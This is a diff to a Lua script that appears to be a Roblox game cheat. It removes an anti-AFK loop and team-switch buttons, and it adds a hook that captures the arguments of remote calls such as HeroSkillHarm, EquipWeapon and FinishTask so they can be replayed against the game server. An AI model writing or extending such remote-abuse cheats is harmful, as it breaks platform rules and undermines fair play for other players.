-  _Misc:AddToggle({"Anti AFK", Settings.AntiAFK, function(Value) Settings.AntiAFK = Value end, "Anti AFK"})
-  _Misc:AddSection("Team")
-  _Misc:AddButton({"Join Cheems Team", function()
-    OtherEvent.MainEvents.Modules:FireServer("Change_Team", "Cheems Recruiter")
-  end})
-  _Misc:AddButton({"Join Floppa Team", function()
-    OtherEvent.MainEvents.Modules:FireServer("Change_Team", "Floppa Recruiter")
-  end})
-  _Misc:AddSection("Others")
-  _Misc:AddToggle({"Remove Notifications", false, function(Value)
-    Player.PlayerGui.AnnounceGui.Enabled = not Value
-  end, "Remove Notifications"})
-end
+--[[
+local args = {
+    [1] = {
+        ["harmIndex"] = 2,
+        ["isSkill"] = true,
+        ["heroGuid"] = "8eea9d46-df8a-4cd5-8166-5b3cc52cd36f",
+        ["skillId"] = 200015
+    }
+}
 
-task.spawn(function()
-  if not _env.AntiAfk then
-    _env.AntiAfk = true
-    
-    while _wait(60*10) do
-      if Settings.AntiAFK then
-        VirtualUser:CaptureController()
-        VirtualUser:ClickButton2(Vector2.new())
+game:GetService("ReplicatedStorage")["Remotes"]["HeroSkillHarm"]:FireServer(unpack(args))
+
+local args = {
+    [1] = "6cd1497a-299a-455f-a250-aace178fcef5"
+}
+
+game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(unpack(args))
+local args = {
+    [1] = "72b7f289-8d06-45f5-a439-bd0b65f703b0"
+}
+
+game:GetService("ReplicatedStorage")["Remotes"]["EquipWeapon"]:FireServer(unpack(args))
+
+]]
+
+--game:GetService("ReplicatedStorage")["Remotes"]["FinishTask"]:FireServer(unpack(args))
+lib:HookFunction(function(method,self,args)
+    if method == "InvokeServer" and self == "ExtractHero" then
+      var.egg.id = args[1]["drawCardPlatformId"]
+      var.egg.count = args[1]["count"]
+    elseif method == "FireServer" and self == "FinishTask" then
+      var.task.id = args[1]
+    elseif method == "FireServer" and self == "HeroSkillHarm" then
+      var.hero.index = args[1]["harmIndex"]
+      var.hero.skill = args[1]["isSkill"]
+      var.hero.guid = args[1]["heroGuid"]
+      var.hero.id = args[1]["skillId"]
+    elseif method == "FireServer" and self == "HeroSkillHarm" and var.hero.ft2 == true then
+      if args[1]["harmIndex"] > var.hero.index then
+        var.hero.index = args[1]["harmIndex"]
+        var.hero.skill = args[1]["isSkill"]
+        var.hero.id = args[1]["skillId"]
       end
+    elseif method == "FireServer" and self == "EquipWeapon" then
+      var.forge.guid = args[1]
     end
-  end
 end)
